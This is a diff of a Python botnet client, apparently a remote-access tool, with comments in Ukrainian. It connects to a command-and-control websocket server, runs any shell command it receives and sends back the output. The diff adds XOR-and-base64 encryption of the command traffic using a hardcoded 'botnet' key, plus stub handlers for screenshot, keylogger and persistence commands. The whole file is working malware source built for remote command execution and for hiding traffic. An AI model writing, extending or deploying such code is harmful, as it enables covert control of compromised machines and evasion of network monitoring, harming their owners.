@@ -1,51 +1,55 @@
 import asyncio
 import websockets
-import json
-import os
+import base64
 import sys
+import os
 
-# Спроба імпортувати pynput, але з ігноруванням помилок для VPS
-try:
-    from pynput import keyboard
-    HAS_GUI = True
-except Exception:
-    HAS_GUI = False
-
+# Конфігурація
 BOT_ID = sys.argv[1] if len(sys.argv) > 1 else "vps-test-bot"
-SERVER_URL = "ws://127.0.0.1:8000/ws"
+SERVER_URL = f"ws://127.0.0.1:8000/ws/{BOT_ID}"
+KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"
+
+def encrypt_message(msg: str) -> str:
+    encrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(msg.encode('utf-8'))])
+    return base64.b64encode(encrypted).decode('utf-8')
+
+def decrypt_message(encoded: str) -> str:
+    try:
+        encrypted = base64.b64decode(encoded)
+        decrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(encrypted)])
+        return decrypted.decode('utf-8', errors='ignore')
+    except:
+        return encoded
 
 async def run_bot():
     print(f"[*] Starting VPS Lite Bot: {BOT_ID}")
     print(f"[*] Connecting to {SERVER_URL}...")
     
     try:
-        async with websockets.connect(SERVER_URL) as websocket:
-            # Реєстрація
-            await websocket.send(json.dumps({
-                "type": "register",
-                "bot_id": BOT_ID,
-                "platform": "Linux (Headless VPS)"
-            }))
-            
-            print("[+] Connected and registered!")
+        # origin=None допомагає уникнути 403 помилки
+        async with websockets.connect(SERVER_URL, origin=None) as websocket:
+            print("[+] Connected successfully!")
 
             while True:
-                message = await websocket.recv()
-                data = json.loads(message)
-                command = data.get("command")
+                # Отримуємо зашифровану команду від сервера
+                encrypted_command = await websocket.recv()
+                command = decrypt_message(encrypted_command)
                 
                 print(f"[*] Received command: {command}")
 
                 if command == "screenshot":
-                    response = "Error: Screenshots not available on headless VPS"
-                    await websocket.send(json.dumps({"type": "screenshot", "data": response}))
+                    response = "SCREENSHOT: (Not available on VPS)"
+                    await websocket.send(encrypt_message(response))
                 
                 elif command == "keylogger":
-                    response = "Error: Keylogger not supported on headless VPS"
-                    await websocket.send(json.dumps({"type": "keylogger", "data": response}))
+                    response = "KEYLOG: (Keylogger not supported on headless VPS)"
+                    await websocket.send(encrypt_message(response))
+                
+                elif command == "persistence":
+                    await websocket.send(encrypt_message("Persistence: Not supported on Linux VPS"))
                 
                 else:
-                    # Виконання звичайних консольних команд
+                    # Виконання консольних команд (Shell)
                     try:
                         proc = await asyncio.create_subprocess_shell(
                             command,
@@ -53,10 +57,10 @@ async def run_bot():
                             stderr=asyncio.subprocess.PIPE
                         )
                         stdout, stderr = await proc.communicate()
-                        output = stdout.decode() + stderr.decode()
-                        await websocket.send(json.dumps({"type": "terminal", "data": output or "Command executed."}))
+                        output = (stdout.decode() + stderr.decode()).strip()
+                        await websocket.send(encrypt_message(output or "Command executed."))
                     except Exception as e:
-                        await websocket.send(json.dumps({"type": "terminal", "data": f"Error: {str(e)}"}))
+                        await websocket.send(encrypt_message(f"Error: {str(e)}"))
 
     except Exception as e:
         print(f"[!] Connection error: {e}")
